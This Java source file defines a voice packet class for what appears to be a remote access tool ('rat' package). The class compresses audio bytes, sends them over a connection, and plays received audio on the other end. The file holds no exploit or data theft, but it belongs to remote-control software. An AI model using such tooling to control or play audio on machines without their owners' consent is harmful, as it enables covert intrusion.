package de.sogomn.rat.packet;

import de.sogomn.engine.fx.Sound;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.QuickLZ;

public final class VoicePacket extends AbstractPingPongPacket {
	
	private byte[] data;
	
	public VoicePacket(final byte[] data) {
		this.data = data;
		
		type = DATA;
	}
	
	public VoicePacket() {
		this(new byte[0]);
		
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		final byte[] compressed = QuickLZ.compress(data);
		
		connection.writeInt(compressed.length);
		connection.write(compressed);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final int length = connection.readInt();
		
		data = new byte[length];
		connection.read(data);
		data = QuickLZ.decompress(data);
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		final Sound sound = Sound.loadSound(data);
		
		sound.play();
	}
	
	public void setData(final byte[] data) {
		this.data = data;
	}
	
	public byte[] getData() {
		return data;
	}
	
	public Sound getSound() {
		final Sound sound = Sound.loadSound(data);
		
		return sound;
	}
	
}
